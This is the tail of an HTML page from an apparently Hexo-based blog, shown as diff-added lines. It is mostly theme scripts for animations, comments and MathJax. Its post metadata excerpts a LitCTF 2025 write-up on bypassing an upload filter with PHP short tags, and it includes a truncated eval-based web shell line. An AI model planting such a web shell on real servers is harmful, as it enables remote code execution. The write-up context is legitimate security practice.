+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+  
+<script src="https://npm.webcache.cn/material-theme@1.0.0/dist/material-theme.umd.js" integrity="sha384-vLev0II0HKFaxkcm+&#x2F;7kX5IGwVFBASkGchU311wmU&#x2F;veIj2bB0UcBkQbW6yw2asK" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "cc",
+          title: "Litctf2025",
+          url: "https://chq576.github.io/2026/03/14/Litctf2025/",
+          excerpt: "",
+          description: "",
+          stripContent: "easy_file（短标签 文件上传 文件包含） 有个登录框，先随便登一个admin&amp;#x2F;admin123,没登成功，但是确实是有admin这个账户存在的且返回admin(YWRtaW4&amp;#x3D;),抓个包，发现YWRtaW4&amp;#x3D;变成了YWRtaW4%3d，base64编码+对特殊字符url编码 到了文件上传界面，php是恶意后缀，且文件内容中不能包括php，所以将里面的php代码改成短标签形式，成功上传短标签.jpg  1&amp;lt;?= @eval($_POST[&amp;#x27;cm",
+          date: "Sat Mar 14 2026 21:13:47 GMT+0800",
+          updated: "Thu Mar 26 2026 23:47:23 GMT+0800",
+          cover: "/images/cc.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["giscus"];
+  var commentConfig = {
+    
+    
+    
+    
+    
+    giscus: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.giscus-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        // 删除可能已存在的 giscus 脚本和 iframe
+        const existingScript = container.querySelector('script[src*="giscus.app/client.js"]');
+        if (existingScript) existingScript.remove();
+        const existingFrame = document.querySelector('iframe.giscus-frame');
+        if (existingFrame) existingFrame.remove();
+
+        const giscusScript = document.createElement('script');
+        const domMode = document.documentElement.getAttribute("data-theme");
+
+        const docLang = document.documentElement.lang || 'en';
+        const langBase = docLang.split('-')[0];
+        const supportedLangs = ['ar', 'be', 'bg', 'ca', 'cs', 'da', 'de', 'en', 
+        'eo', 'es', 'eu', 'fa', 'fr', 'gr', 'hbs', 'he', 'hu', 'id', 'it', 'ja', 
+        'kh', 'ko', 'nl', 'pl', 'pt', 'ro', 'ru', 'th', 'tr', 'uk', 'uz', 'vi', 'zh-CN', 'zh-HK', 'zh-TW'];
+        const giscusLang = supportedLangs.includes(docLang) ? docLang : supportedLangs.includes(langBase) ? langBase : 'en';
+
+        giscusScript.src = 'https://giscus.app/client.js';
+        giscusScript.setAttribute('data-repo', '');
+        giscusScript.setAttribute('data-repo-id', '');
+        giscusScript.setAttribute('data-category', ''); 
+        giscusScript.setAttribute('data-category-id', '');
+        giscusScript.setAttribute('data-mapping', '0');
+        giscusScript.setAttribute('data-strict', '0');
+        giscusScript.setAttribute('data-reactions-enabled', '1');
+        giscusScript.setAttribute('data-emit-metadata', '0');
+        giscusScript.setAttribute('data-input-position', 'bottom');
+        giscusScript.setAttribute('data-theme', domMode === 'dark' ? 'dark' : 'light');
+        giscusScript.setAttribute('data-lang', giscusLang);
+        giscusScript.setAttribute('crossorigin', 'anonymous');
+        giscusScript.async = true;
+        container.appendChild(giscusScript);
+        document.body.addEventListener('light-theme-set', () => {
+          const iframe = document.querySelector('iframe.giscus-frame');
+          if (!iframe) return;
+          iframe.contentWindow.postMessage({ giscus: { setConfig: { theme: 'light' } } }, 'https://giscus.app');
+        });
+        document.body.addEventListener('dark-theme-set', () => {
+          const iframe = document.querySelector('iframe.giscus-frame');
+          if (!iframe) return;
+          iframe.contentWindow.postMessage({ giscus: { setConfig: { theme: 'dark' } } }, 'https://giscus.app');
+        });
+      }
+    }
+    
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.10.2' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha384-Wuix6BuhrWbjDBs24bXrjf4ZQ5aFeFWBuKkFekO2t8xFU0iNaLQfp2K6&#x2F;1Nxveei" crossorigin="anonymous" defer data-pjax></script>
+
+    <script data-pjax>
+      window.MathJax = {"tex":{"tags":"ams","useLabelIds":true,"inlineMath":[["$","$"],["\\\\(","\\\\)"]],"displayMath":[["$$","$$"],["\\\\[","\\\\]"]],"processEscapes":true,"processEnvironments":true,"autoload":{"color":[],"colorv2":["color"]},"packages":{"[+]":["noerrors"]}},"options":{"skipHtmlTags":["script","noscript","style","textarea","pre","code"],"ignoreHtmlClass":"tex2jax_ignore","processHtmlClass":"tex2jax_process"},"loader":{"load":["input/asciimath","[tex]/noerrors"]}};
+    </script>
+  
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
